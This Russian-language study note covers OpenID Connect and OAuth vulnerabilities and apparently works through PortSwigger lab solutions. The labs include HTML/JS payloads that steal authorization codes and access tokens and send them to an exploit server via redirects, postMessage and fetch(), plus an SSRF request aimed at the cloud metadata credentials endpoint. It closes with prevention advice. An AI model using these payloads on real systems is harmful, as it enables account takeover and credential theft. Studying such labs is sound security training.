Основным преимуществом использования `id_token` является уменьшение количества запросов, которые необходимо отправлять между клиентским приложением и службой OAuth, что может обеспечить более высокую общую производительность. Вместо того, чтобы получать токен доступа, а затем отдельно запрашивать данные пользователя, ID-токен, содержащий эти данные, отправляется в клиентское приложение сразу после аутентификации пользователя.

Вместо того, чтобы просто полагаться на доверительный (trusted) канал, как это происходит в базовом OAuth, целостность данных, передаваемых в ID-токене, основана на криптографической подписи JWT. По этой причине использование ID-токенов может помочь защитить от некоторых атак типа «человек посередине». Однако, учитывая, что криптографические ключи для проверки подписи передаются по тому же сетевому каналу (обычно доступному по адресу `/.well-known/jwks.json`), некоторые атаки все же возможны.

Обратите внимание, что OAuth поддерживает несколько типов ответов, поэтому для клиентского приложения вполне допустимо отправлять запрос на авторизацию как с basic типом ответа OAuth, так и с типом ответа `id_token` OpenID Connect:

- `response_type=id_token token`
- `response_type=id_token code`

В этом случае клиентскому приложению одновременно будут отправлены как ID-токен, так и код или токен доступа.

---

## Идентификация OpenID Connect

Если OpenID Connect активно используется клиентским приложением, это должно быть очевидно из запроса на авторизацию. Самый надежный способ проверить это — поискать обязательный openid `scope`.

Даже если вначале кажется, что процесс входа в систему не использует OpenID Connect, все равно стоит проверить, поддерживает ли его служба OAuth. Вы можете просто попробовать добавить `openid` `scope` или изменить тип ответа на `id_token` и посмотреть, приведет ли это к ошибке.

Как и в случае с базовым OAuth, также рекомендуется ознакомиться с документацией поставщика OAuth, чтобы узнать, есть ли в ней полезная информация о поддержке OpenID Connect. Вы также можете получить доступ к файлу конфигурации из стандартной конечной точки` /.well-known/openid-configuration`.

---

## Уязвимости OpenID Connect

Спецификация OpenID Connect гораздо строже, чем у базового OAuth, что означает, что в целом меньше возможностей для странных реализаций с явными уязвимостями. Тем не менее, поскольку это всего лишь слой, расположенный поверх OAuth, клиентское приложение или служба OAuth все еще могут быть уязвимы для некоторых из рассмотренных ранее атак на основе OAuth.

---

### 1. Незащищенная динамическая регистрация клиента

Спецификация OpenID описывает стандартизированный способ регистрации клиентских приложений у поставщика OpenID. Если поддерживается динамическая регистрация клиента, клиентское приложение может зарегистрироваться самостоятельно, отправив `POST` запрос на специальный конечный пункт `/registration`. Название этого конечного пункта обычно указано в файле конфигурации и документации.

В теле запроса клиентское приложение отправляет ключевую информацию о себе в формате JSON. Например, часто требуется включить массив URI перенаправления из белого списка. Оно также может отправить ряд дополнительной информации, такой как имена конечных точек, которые оно хочет раскрыть, название своего приложения и т. д. Типичный запрос на регистрацию может выглядеть примерно так:

```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

Провайдер OpenID должен требовать от клиентского приложения пройти аутентификацию. В приведенном выше примере используется HTTP bearer token. Однако некоторые провайдеры разрешают динамическую регистрацию клиентов без аутентификации, что позволяет злоумышленнику зарегистрировать собственное вредоносное клиентское приложение. Это может иметь различные последствия в зависимости от того, как используются значения свойств, контролируемых злоумышленником.

Например, вы могли заметить, что некоторые из свойств могут быть предоставлены в виде URI. Если какой-либо из них доступен провайдеру OpenID, это может потенциально привести к уязвимостям SSRF второго порядка, если не приняты дополнительные меры безопасности.

Лабораторная: [[#Lab SSRF via OpenID dynamic client registration]]

---

### 2. Разрешение запросов авторизации по ссылке.

До этого момента мы рассматривали стандартный способ отправки необходимых параметров для запроса авторизации, т. е. через строку запроса. Некоторые провайдеры OpenID предоставляют возможность передавать эти параметры в виде веб-токена JSON (JWT). Если эта функция поддерживается, вы можете отправить один параметр `request_uri`, указывающий на веб-токен JSON, который содержит остальные параметры OAuth и их значения. В зависимости от конфигурации службы OAuth этот параметр `request_uri` является еще одним потенциальным вектором для SSRF.

Вы также можете использовать эту функцию, чтобы обойти проверку значений параметров. Некоторые серверы могут эффективно проверять строку запроса в запросе на авторизацию, но не могут адекватно применять ту же проверку к параметрам в JWT, включая `redirect_uri`.  

Чтобы проверить, поддерживается ли эта опция, вам следует найти опцию `request_uri_parameter_supported` в файле конфигурации и документации. В качестве альтернативы вы можете просто попробовать добавить параметр `request_uri`, чтобы проверить, работает ли он. Вы обнаружите, что некоторые серверы поддерживают эту функцию, даже если они явно не упоминают ее в своей документации.

---

# Лабораторные

---

## Lab: Authentication bypass via OAuth implicit flow

https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

1. Изучим запросы потока авторизации OAuth, начиная с `GET /auth?client_id=[...]`;
2. Клиентское приложение (блог-сайт) получает базовую информацию о пользователе от сервиса OAuth. Затем пользователь входит в систему, отправляя `POST` запрос с этой информацией на его конечную точку `/authenticate` вместе с токеном доступа;
3. С помощью **Intercept** на финальном шаге авторизации в запросе 
   > ```http
   > POST /authenticate HTTP/2
   > Host: YOUR-LAB-ID.web-security-academy.net
   > Content-Type: application/json
   > 
   > {"email":"wiener@hotdog.com","username":"wiener","token":"65NzlN6foVJmqVEBU2ru7UaFVe4nIe3QI-q2OYyArDB"}
   > ```
   > Изменим:
   > 1. `email` на `carlos@carlos-montoya.net`;
   > 2. `username` на `carlos`.
   
---

## Lab: Forced OAuth profile linking

https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

> [!info]
> В этой лабораторной по алгоритму гранта **"Authorization code"** для привязки двух аккаунтов:
> 1. Проходит авторизацию первый пользователь (вы - `peter.wiener:hotdog`), но на этапе [[#3. Выдача кода авторизации]] код авторизации получает другой пользователь, когда OAuth сервер перенаправляет его обратно на сайт приложения с параметром `code` (authorization code) на URI `/oauth-linking`.
>    >`code` — одноразовый токен авторизации `peter.wiener:hotdog`, который клиент (`carlos`) должен обменять на токены доступа.
>
> 2. Далее [[#4. Запрос токена доступа]]. Здесь клиентское приложение продолжает связывать социальный профиль `peter.wiener` с учётной записью `carlos` и **не проверяет, откуда пришёл этот запрос** из-за отсутствия `state`.

**Решение:**

В лабораторной имеется функционал привязки профиля социальной сети к основному профилю. Для этого используется OAuth. **Проблема в том, что отсутствует защита от CSRF (нет параметра `state`) в запросе на привязку профиля**, поэтому злоумышленник может заставить другого пользователя (victim/admin) выполнить OAuth-flow с **кодом, контролируемым атакующим**, и привязать свой собственный OAuth-профиль к аккаунту жертвы.

1. В истории запросов изучите серию OAuth запросов на добавление соц. профиля. В запросе `GET /auth?client_id[...]` обратите внимание, что `redirect_uri` отправляет код авторизации в `/oauth-linking`;
2. Начните привязывать профиль, но с помощью Intercept пропускайте запросы, пока не перехватите `GET /oauth-linking?code=[...]`. Кликните правой кнопкой мыши по этому запросу и выберите «copy URL». 
3. Откажитесь от запроса. Это важно для того, чтобы код не использовался и, следовательно, оставался действительным. Отключите перехват прокси и выйдите из блога.
4. Зайдите на сервер эксплойтов и создайте `window.location` на только что скопированный вами URL. Результат должен выглядеть примерно так: 
   > ```html
   > <script>
   > 	window.location="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"
   > </script>
   > ```
5. Доставьте эксплойт жертве.
6. Вернитесь на сайт блога и снова выберите опцию «Войти в социальные сети». Обратите внимание, что вы сразу входите в систему как администратор. Зайдите в панель администратора и удалите `carlos`, чтобы решить лабораторию.

---

## Lab: OAuth account hijacking via redirect_uri

https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

1. Создаём нагрузку с поддельным `redirect_uri`:
   ```html
   <script>
window.location="https://oauth-YOUR-OAUTH-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-COLLABORATOR-ID.oastify.com&response_type=code&scope=openid%20profile%20email"
</script>
   ```
2. Получаем код доступа через перехваченный код авторизации: 
   ```
   https://{YOUR-LAB-ID}.web-security-academy.net/oauth-callback?code={AUTH-CODE}
   ```

---

## Lab: Stealing OAuth access tokens via an open redirect

https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

**Исследование:**
1. OAuth использует Implicit грант: `response_type=token`;
2. Данные пользователя запрашиваются по следующей API точке:
   > ```http
   > GET /me HTTP/2
Host: oauth-YOUR-OAUTH-ID.oauth-server.net
Authorization: Bearer YOUR-BEARER-TOKEN
   > ```
   > Ответ:
   > ```json
   > {
   > 	"sub":"wiener",
   > 	"apikey":"orVpAFxSKoJbEMkZ68buTEUy2JZsmAa7",
   > 	"name":"Peter Wiener",
   > 	"email":"wiener@hotdog.com",
   > 	"email_verified":true
   > }
   > ```
   
3. В запросе `GET /auth?client_id=...` в параметре `redirect_uri` нельзя изменить основную страницу, но можно дописывать путь, например с помощью `/../../` или `../post?postId=1`, при чём токен доступа будет включен в запрос как hash-параметр:
   
   ![[Pasted image 20260202171948.png]]
4. Кнопка "Next post" имеет открытое перенаправление в параметре `path`. Используем её путь: `GET /post/next?path=...`.

**Атака:**

Необходимо собрать эксплойт, работающий в 2 шага: 
1. Первичный заход пользователя - начало OAuth рукопожатия, которое в конце редиректит на эксплойт сервер, передавая токен доступа. Но передача происходит как hash параметр, поэтому, чтобы увидеть его в логах, его нужно извлекать с помощью JS.
2. Извлечение hash параметров (при наличии) и сохранение их в логи. 

Соответственно подходит конструкция: 
``` html
<script> 
	if (!document.location.hash) {
		window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
	} else { 
	window.location = '/logs?'+document.location.hash.substr(1) 
	} 
</script>
```

3. Подставляем полученный токен доступа в API `GET /me`. 

---

## Lab: Stealing OAuth access tokens via a proxy page

https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

**Исследование:**

1. На каждой странице поста (`/post?postId=...`) можно заметить `<iframe>` с адресом `/post/comment/comment-form`:
> ```html
>    <iframe onload='this.height = this.contentWindow.document.body.scrollHeight + "px"' width=100% frameBorder=0 src='/post/comment/comment-form#postId=1'></iframe>
> ```

2. На странице `/post/comment/comment-form` видим следующий скрипт:
   > ```html
   > <script>
   > 	parent.postMessage({type: 'onload', data: window.location.href}, '*')
   > 	function submitForm(form, ev) {
   > 		ev.preventDefault();
   > 		const formData = new FormData(document.getElementById("comment-form"));
   > 		const hashParams = new URLSearchParams(window.location.hash.substr(1));
   > 		const o = {};
   > 		formData.forEach((v, k) => o[k] = v);
   > 		hashParams.forEach((v, k) => o[k] = v);
   > 		parent.postMessage({type: 'oncomment', content: o}, '*');
   > 		form.reset();
   > 	}
   > </script>
   > ```
   > - Этот скрипт **работает внутри iframe** (страница `comment-form`).  
   > - 👉 `window.postMessage() / parent.postMessage()` — механизм безопасного (в теории) общения между окнами / iframe.
`parent` — это **страница, которая встроила этот iframe**.
> ```js
> parent.postMessage({type: 'onload', data: window.location.href}, '*')
> ```
> Сразу при загрузке iframe скрипт **отправляет сообщение родительскому окну**. В сообщении:
> - `type: 'onload'`
> - `data: window.location.href` ← **ПОЛНЫЙ URL iframe**
> 
> Если OAuth вернул токен, он будет в URL **после `#`**, например:
> ``` 
> /comment-form#access_token=abc123&token_type=bearer
> ```
> 👉 `window.location.href` **содержит access token**  
> 👉 Он уходит в `postMessage`  
> 👉 Родитель может его прочитать
>
>**Главная проблема:**
> - **`comment-form` принимает сообщения от любого источника (`*`)**, что означает, что данные можно получить почти из любого iframe!
> >
> 
> **👉 Это означает, что можно:**
> >
> - Загрузить эту страницу в iframe,
> - Отправить туда OAuth-ответ,
> - Получить access token через механизм `postMessage`.

3. Сам GET запрос `/auth?client_id=...`  OAuth имеет уязвимость **directory traversal**, позволяющую подставить в `redirect_uri` любую страницу исходного, разрешённого сайта.

**Решение лабораторной:**

На внешнем «сервере злоумышленника» создаётся HTML-страница:
``` html
1. `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`

<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
}, false);
</script>
```
>🔍 Что здесь происходит:
>
>1. В iframe загружается **OAuth URL** с изменённым `redirect_uri`.
>2. Используется directory traversal (`../`), чтобы направить OAuth-ответ на страницу комментариев (`comment-form`).
>3. После успешной авторизации OAuth-провайдер вернёт URL с access token в хэше (`#access_token=...`).
>4. Этот токен попадёт на страницу `comment-form`.
>5. Скрипт слушает `postMessage` и отправляет данные на свой сервер (например, записывает токен).

**Ключевая проблема безопасности в лабораторной:**
> - ❌ Использование небезопасного `postMessage` (`*`) означает, что токен может быть захвачен другим контекстом.
> - ❌ Неправильная проверка `redirect_uri` позволяет злоумышленнику переписать этот адрес.

---

## Lab: SSRF via OpenID dynamic client registration

https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

1. Откроем документации OAuth по пути: 
   ```
   https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
   ```
2. Видим следующее значение:
   ``` 
   "registration_endpoint":"https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/reg"
   ```
   Значит, потенциально, мы можем регистрировать новый путь.
3. Пробуем:
   
   ![[Pasted image 20260206140335.png]]
   
   ![[Pasted image 20260206140359.png]]
   
   ![[Pasted image 20260206140536.png]]
   
   ![[Pasted image 20260206140623.png]]
   
   Успех. Мы успешно зарегистрировали собственное клиентское приложение без необходимости аутентификации. Ответ содержит различные метаданные, связанные с вашим новым клиентским приложением, включая новый client_id.
4. На странице подтверждения разрешений OAuth мы видим логотип клиентского приложения:
   
   ![[Pasted image 20260206141233.png]]
   
   Он загружается из `/client/CLIENT-ID/logo`. 
   
   ![[Pasted image 20260206141329.png]]
   
   Из спецификации OpenID известно, что клиентские приложения могут предоставлять URL-адрес своего логотипа с помощью свойства `logo_uri` во время динамической регистрации. 
5. Добавим `logo_uri` в свой зарегистрированный сайт со ссылкой на collaborator:
   
   ![[Pasted image 20260206141831.png]]
   
   Проверим, работает ли запрос в колаборатор:
   
   ![[Pasted image 20260206142001.png]]
   
   ![[Pasted image 20260206142024.png]]
   
   > Таким образом мы видим, что мы потенциально можем без авторизации зарегистрировать любые данные по http на OAuth сервер и получить из значение в разделе иконки.

1. Регистрируем на месте иконки endpoint из лабораторной:
   ``` http
   POST /reg HTTP/2
   Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
   Content-Type: application/json; charset=utf-8
   Content-Length: 156

   {"redirect_uris":["https://example.com"],
   "logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
   ```
   > Получаем данные:
   > 
   > ![[Pasted image 20260206142606.png]]

---

# Предотвращение OAuth уязвимостей 

Чтобы предотвратить уязвимости аутентификации OAuth, как поставщику OAuth, так и клиентскому приложению необходимо реализовать надежную проверку ключевых входных данных, особенно параметра `redirect_uri`. В спецификации OAuth предусмотрено очень мало встроенных средств защиты, поэтому разработчики сами должны обеспечить максимальную безопасность потока OAuth.

Важно отметить, что уязвимости могут возникать как со стороны клиентского приложения, так и со стороны самого сервиса OAuth. Даже если ваша собственная реализация абсолютно надежна, в конечном итоге вы все равно полагаетесь на то, что приложение на другом конце будет столь же надежным.

## Для поставщиков услуг OAuth

- Требуйте от клиентских приложений регистрации белого списка допустимых `redirect_uris`. По возможности используйте строгое byte-for-byte сравнение для проверки URI во всех входящих запросах. Разрешайте только полные и точные совпадения, а не используйте сопоставление шаблонов. Это предотвращает доступ злоумышленников к другим страницам в доменах, включенных в белый список.
- Обязательно используйте параметр `state`. Его значение также должно быть привязано к сеансу пользователя путем включения некоторых непредсказуемых данных, специфичных для сеанса, таких как хэш, содержащий сессионный куки. Это помогает защитить пользователей от атак типа CSRF. Кроме того, это значительно затрудняет злоумышленникам использование украденных кодов авторизации.
- На сервере ресурсов убедитесь, что токен доступа был выдан тому же `client_id`, который делает запрос. Вы также должны проверить запрашиваемый `scope`, чтобы убедиться, что он соответствует `scope`, для которого первоначально был предоставлен токен.

## Для клиентских приложений OAuth.

- Перед внедрением OAuth убедитесь, что вы полностью понимаете, как он работает. Многие уязвимости возникают из-за простого непонимания того, что именно происходит на каждом этапе и как это может быть потенциально использовано.
- Используйте параметр `state`, даже если он не является обязательным.
- Отправляйте параметр `redirect_uri` не только в конечную точку `/authorization`, но и в конечную точку `/token`.
- При разработке мобильных или нативных настольных клиентских приложений OAuth часто невозможно сохранить конфиденциальность `client_secret`. В таких ситуациях можно использовать механизм PKCE (RFC 7636) для дополнительной защиты от перехвата или утечки кода доступа.
- Если вы используете OpenID Connect `id_token`, убедитесь, что он правильно проверен в соответствии со спецификациями JSON Web Signature, JSON Web Encryption и OpenID.
- Будьте осторожны с кодами авторизации — они могут утечь через заголовки Referer при загрузке внешних изображений, скриптов или CSS-контента. Также важно не включать их в динамически сгенерированные файлы JavaScript, так как они могут быть выполнены из внешних доменов через теги `<script>`.